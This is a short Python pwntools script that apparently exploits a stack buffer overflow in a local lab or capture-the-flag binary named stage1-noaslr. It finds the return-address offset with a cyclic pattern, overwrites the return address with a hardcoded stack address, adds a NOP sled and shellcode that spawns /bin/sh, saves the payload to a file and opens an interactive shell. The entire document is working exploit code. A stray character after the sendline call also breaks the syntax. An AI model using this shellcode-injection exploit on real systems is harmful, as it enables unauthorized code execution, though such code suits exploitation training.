#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = '/bin/sh'
context.aslr = False
context.arch = 'amd64'
context.os = 'linux'

p = process('/home/stage1/stage1-noaslr')
p.recvuntil(b"What's your guess?")

substring = pack(0x616161706161616f)
offset = cyclic(80).find(substring)
target = p64(0x00007fffffffe3b0)

payload = (b'A' * offset) + target + (b'\x90' * 400) + asm(shellcraft.sh())

file = open('payaslr', 'wb')
file.write(payload)
file.close()

p.sendline(payload)z

p.interactive()
